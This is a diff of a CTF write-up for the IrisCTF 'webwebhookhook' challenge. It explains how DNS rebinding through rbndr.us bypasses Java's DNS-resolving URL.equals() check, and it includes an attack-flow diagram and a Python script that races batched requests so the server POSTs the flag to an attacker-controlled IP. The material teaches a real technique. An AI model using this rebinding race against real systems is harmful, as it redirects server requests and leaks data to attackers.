@@ -7,8 +7,8 @@ difficulty: "medium"
 tags: ["writeup", "race condition", "DNS rebinding"]
 ---
 
-## TLDR
-The challenge consisted in exploiting a **race condition** by using **DNS rebinding** to bypass `URL.equals()` check in Java. 
+## TL;DR
+The challenge consisted in exploiting a **Race Condition** by using **DNS rebinding** to bypass `URL.equals()` check in Java. 
 
 ## Description
 > I made a service to convert webhooks into webhooks.
@@ -133,17 +133,159 @@ Essentially, this endpoint registers a new webhook configuration, unless it alre
 **Note** that both the endpoints do not provide SSRF protections, however it's irrelevant for us as there are no additional services running on the server.
 
 ## Identifying the vulnerability
-At first glance, there doesn't seem to be an obvious way to intercept the flag, since the only way would be to successfully match the check hook and send the `POST` to `example.org`, which would be ez game if we were the admins of domain, which is not the case :P.  
+At first glance, there doesn't seem to be an obvious way to intercept the flag, since the only way would be to successfully match the check hook and send the `POST` to `example.org`, which would be ez game if we were the admins of domain, which is not the case :P  
 One of my first steps was to try an HTTP smuggling, given the arbitrary control over the body that then replaces the content of `_DATA_`, to build a request like this:
 
-![image not loaded](./h2_attempt.png "Smuggling/Desync attempt on body content.")
+![Image not loaded](./h2_attempt.png "Smuggling/Desync attempt on body content.")
 
-However, we note how the body of the request is correctly set based on the length of our payload at L31 with `conn.setFixedLengthStreamingMode(newBody.length)` consequently failing to delimit the stream of the request to build a new one. Furthermore, it is not possible to override the request headers and in any case it would be a matter of exploiting a Spring Boot HTTP desync but today will not be the day of 0-days :/
+However, we note how the body of the request is correctly set based on the length of our payload at **L31** with `conn.setFixedLengthStreamingMode(newBody.length)` consequently failing to delimit the stream of the request to build a new one. Furthermore, it is not possible to override the request headers and in any case it would be a matter of exploiting a Spring Boot HTTP desync but today will not be the day of 0-days :/
 
-Finally, in a scenario of arbitrary write in the system we could have tried to overwrite `/etc/hosts` to override the DNS resolution of `example.org` and make it point to an IP under our control, but again, this is not the case for the challenge.
+Finally, in a scenario of arbitrary write in the system we could have tried to overwrite `/etc/hosts` file to override the DNS resolution of `example.org` and make it point to an IP under our control, but again, this is not the case for the challenge.
 
+### Doomscrolling remembrance of a random tweet to win
+At that point I was pretty lost, the code was really minimal and I had to somehow pull off a complete domain check bypass from a bunch of URL comparisons...  
 
-## Exploitation
+> Wait did I say "domain check bypass" and "url comparison" !?  
+
+That's exactly what I said to myself while overthinking the challenge and I had the remembrance of a (quite strange) Java behavior that I barely read about in a random tweet months ago while doomscrolling on X, which pointed out how comparing two URL objects in Java triggers a DNS resolution 💀  
+
+{{< twitter user="ChShersh" id="1832688521762496747" >}}
+
+**More of that is discussed at the end of the writeup.**
+
+At this point this enlightenment gave me a clear path to the resolution using **DNS rebinding**:
+- 1) submit to `/endpoint` a domain like `rbndr.us` that resolves to the IP of `example.com`.
+- 2) `URL.equals()` will trigger a DNS resolution on `rbndr.us` that will make succeed the check against `example.com`.
+- 3) make the `rbndr.us` domain resolve to different IP under our control.
+- 4) the `POST` request will be sent to the IP under our control, with the template body containing the flag.
+
+Yep. That's it. Simple as that right?  
+🥲  
+No. 🥲
+
+Well, kinda, in theory (and in practice) that would work, I confirmed that the DNS resolution was made on the provided domain and by using a DNS rebinding service like `rbndr.us` I was able to get different response status codes from the server (because different domains were resolved each time).  
+This behavior was caused by the under the hood work of [rbndr](https://github.com/taviso/rbndr), which as explained on their repo, all it does is simply provide a domain that resolves to **A** with a very low TTL, and then immediately switch the DNS resolution to **B** so that when a new DNS query is made to the same domain the second time it'll point a different IP address.  
+All of that is the basics of how a DNS rebinding attack works, which you can read more about [here](https://github.com/taviso/rbndr?tab=readme-ov-file#rbndr).
+
+The main hurdle however was not to make DNS rebinding work, but to leverage DNS rebinding to cause a Race when **1)** the domain DNS resolves to `example.org` IP to make the `URL.equals()` succeed, and **2)** the server opens a connection against my domain (causing a new DNS resolution) to send the request with the flag.  
+Unfortunately for my sanity, as we can see from the code between **L23** and **L25**, trying to exploit such a window meant finding a precision of a matter of milliseconds.
+
+```kotlin {lineNos=inline, lineNoStart=23}
+if(h.hook == hook) {
+    var newBody = h.template.replace("_DATA_", body);
+    var conn = hook.openConnection() as? HttpURLConnection;
+```
+
+Below I have illustrated the attack workflow.
+
+<div style="background-color:white; padding: 20px">
+{{< mermaid >}}
+sequenceDiagram
+    title DNS Rebinding attack flow on Java `URL.equals()`
+
+    participant Attacker as Attacker
+    participant ChallengeServer as Challenge Server
+    participant AttackerServer as Attacker Rebinder Service (xxxx.rbndr.us)
+    participant DNS as Attacker DNS Server
+
+    Attacker->>ChallengeServer: POST /endpoint <br/> ?hook=xxxx.rbndr.us
+
+    note over DNS: DNS A Record is 93.184.215.14, TTL=1 (example.org IP)
+    note over DNS: DNS A Record is 83.130.170.16, TTL=1 (attacker IP)
+    note over DNS: DNS A Record is 93.184.215.14, TTL=1 (example.org IP)
+    note over DNS: DNS A Record is 83.130.170.16, TTL=1 (attacker IP)
+    note over DNS: ...
+
+    note over ChallengeServer: 1) the server code uses <br/>URL.equals() to compare <br/>“xxxx.rbndr.us” vs “example.org”
+    ChallengeServer->>DNS: DNS Query A for xxxx.rbndr.us
+    note over DNS: 2) DNS A Record is 93.184.215.14, TTL=1 (example.org IP)
+    DNS-->>ChallengeServer: DNS A response (TTL=1) for xxxx.rbndr.us: 93.184.215.14
+
+    note over ChallengeServer: 3) URL.equals() returns true <br/> because IP matches example.org <br/>
+    note over DNS: DNS A Record is 83.130.170.16, TTL=1 (attacker IP)
+    note over ChallengeServer: 4) hook.openConnection() <br/> where hook=xxxx.rbndr.us <br/>
+    ChallengeServer->>DNS: DNS Query A for xxxx.rbndr.us
+    
+    note over DNS: 5) DNS A Record is 83.130.170.16, TTL=1 (attacker IP) <br> DNS “rebinding” event, xxxx.rbndr.us is resolving to Attacker's IP
+    DNS-->>ChallengeServer: DNS A response (TTL=1) for xxxx.rbndr.us: 83.130.170.16
+    
+    note over ChallengeServer: 5) Opens HTTP connection to 83.130.170.16 
+    note over DNS: DNS A Record is 93.184.215.14, TTL=1 (example.org IP)
+    note over DNS: ...
+    
+    ChallengeServer->>Attacker: POST to 83.130.170.16 <br/> {"flag":"irisctf{...}"} 
+    Attacker-->>Attacker: Captures the flag (win)
+{{< /mermaid >}}
+</div>
+
+A trick I used to increase my chances of hitting the exact window between **Step 1** and **Step 4** was to send a large payload in the body to be processed, so that **L34** would have a slightly longer execution time to give us the possibility of hitting the DNS resolution change in a larger window.
+
+{{< alert >}}
+**NOTE**: An interesting research would be to understand how `String.replace()` is performed internally by Java/Kotlin, since there could be the possibility of using some classic ReDoS tricks to increase the execution time of `h.template.replace("_DATA_", body)` even more.
+{{< /alert >}}
+
+## Exploitation (cry and pray)
+Having gathered all the elements to exploit, I proceeded to write the following python script:
+
+**exploit.py**
+```python
+#!/usr/bin/python3
+import requests
+import time
+import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+RBNDR = "http://5db8d70e.5e82aa10.rbndr.us"
+CHALL_URL = "https://webwebhookhook-43435a7246999280.i.chal.irisc.tf"
+BATCH_SIZE = 20
+DELAY_BETWEEN_BATCHES = 0.1
+
+req_id = 0
+req_id_lock = threading.Lock()
+
+def send_request(session, url, payload):
+    global req_id
+    try:
+        response = session.post(url, headers={"Content-Type":"application/x-www-form-urlencoded"}, data=payload, timeout=10)
+        with req_id_lock:
+            req_id += 1
+            current_id = req_id
+        print(f"{current_id} {response.text} {response.status_code}")
+    except Exception as e:
+        with req_id_lock:
+            req_id += 1
+            current_id = req_id
+        print(f"{current_id} Error: {e}")
+
+def main():
+    url = f"{CHALL_URL}/webhook?hook={RBNDR}/admin"
+    payload = "A"*1000
+
+    with requests.Session() as session:
+        with ThreadPoolExecutor(max_workers=BATCH_SIZE) as executor:
+            while True:
+                futures = [
+                    executor.submit(send_request, session, url, payload)
+                    for _ in range(BATCH_SIZE)
+                ]
+
+                for future in as_completed(futures):
+                    pass 
+
+                time.sleep(DELAY_BETWEEN_BATCHES)
+
+if __name__ == "__main__":
+    main()
+```
+
+A little bit of explanation for it:
+- The `RBNDR` url was constructed with a [rebinder service](https://lock.cmpxchg8b.com/rebinder.html) using the `example.com` IP as the first IP and my VPS IP as the second IP.
+- I opted for a requests batched approach to have an high density of requests in a short time window.
+- Large body payload to increase the execution time of `h.template.replace("_DATA_", body)` and thus increasing the duration of the target window. 
+- Spamming the `/webhook` with a while true loop to have different DNS cache TTLs and increase the chances of an IP switch in the DNS server during the target window.
+
+## Extra
+[...]
 
 ---
-`irisctf{url_equals_rebind}`
+Flag: `irisctf{url_equals_rebind}`
